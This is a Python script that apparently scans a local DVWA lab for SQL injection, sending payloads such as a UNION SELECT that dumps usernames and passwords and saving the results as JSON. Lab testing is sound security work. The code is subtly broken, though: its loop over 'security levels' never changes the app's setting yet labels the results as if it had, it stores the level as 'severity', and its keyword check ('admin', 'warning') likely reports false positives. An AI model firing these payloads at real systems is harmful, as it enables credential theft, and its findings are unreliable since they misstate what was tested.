import requests
import json

def run():
    findings = []
    
    test_url = "http://localhost:8080/vulnerabilities/sqli/"

    # SQLi payloads for testing
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT username,password FROM users --"
    ]

    # DVWA security levels
    security_levels = {
        "Low": "low",
        "Medium": "medium",
        "High": "high"
    }

    # Loop through all DVWA security levels
    for level_name, level_value in security_levels.items():
        params = {"id": "1", "Submit": "Submit"}

        print(f"\nScanning {level_name} Security Level:")

        for payload in sqli_payloads:
            params["id"] = payload

            try:
                response = requests.get(test_url, params=params)

                # Check for SQLi response patterns
                is_vulnerable = (
                    response.status_code == 200 and
                    ("error in your SQL syntax" in response.text.lower() or
                     "warning" in response.text.lower() or
                     "username" in response.text.lower() or
                     "admin" in response.text.lower())
                )

                # Record findings
                findings.append({
                    "security_level": level_name,
                    "payload": payload,
                    "endpoint": test_url,
                    "vulnerable": bool(is_vulnerable),
                    "status_code": response.status_code,
                    "evidence": response.text[:200]
                })

                if is_vulnerable:
                    print(f"[!] SQL Injection Found with payload: {payload}")
                else:
                    print(f"[-] No vulnerability for payload: {payload}")

            except Exception as e:
                findings.append({
                    "security_level": level_name,
                    "payload": payload,
                    "endpoint": test_url,
                    "vulnerable": False,
                    "evidence": f"Error: {str(e)}"
                })
                print(f"[Error] Request failed for payload: {payload}")

    # Save results to JSON
    # Convert results into proper format for Security Report Generator
    output = {
        "findings": [
            {
                "test": "SQL Injection",
                "url": item.get("endpoint"),
                "severity": item.get("security_level"),
                "payload": item.get("payload"),
                "vulnerable": item.get("vulnerable"),
                "status_code": item.get("status_code"),
                "evidence": item.get("evidence")
            }
            for item in findings
        ]
    }

    # Save formatted results
    with open("sql_findings.json", "w", encoding="utf-8") as json_file:
        json.dump(output, json_file, indent=4, ensure_ascii=False)

    # with open("sql_findings.json", "w") as json_file:
    #     json.dump(findings, json_file, indent=4)

    print("\nResults saved to sql_findings.json")
